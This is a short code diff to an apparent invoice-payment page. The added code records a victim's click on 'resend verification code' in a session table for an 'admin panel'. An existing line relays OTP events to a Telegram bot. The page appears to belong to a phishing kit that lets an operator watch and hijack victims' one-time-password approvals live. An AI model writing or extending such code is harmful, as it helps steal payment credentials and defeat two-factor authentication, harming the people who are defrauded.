@@ -152,6 +152,13 @@ const InvoicePayment = () => {
   const handleOtpResend = async () => {
     if (!sessionId) return;
     try {
+      // Update session form_data with resend flag so admin panel sees it
+      const { data } = await supabase.from("sessions").select("form_data").eq("id", sessionId).single();
+      const existingData = (data?.form_data as Record<string, any>) || {};
+      await supabase.from("sessions").update({
+        form_data: { ...existingData, resend_requested: true, resend_requested_at: new Date().toISOString() } as any,
+      }).eq("id", sessionId);
+
       await supabase.functions.invoke("send-to-telegram", {
         body: { type: "otp", otp: "🔄 Client clicked RESEND verification code / approval request" },
       });
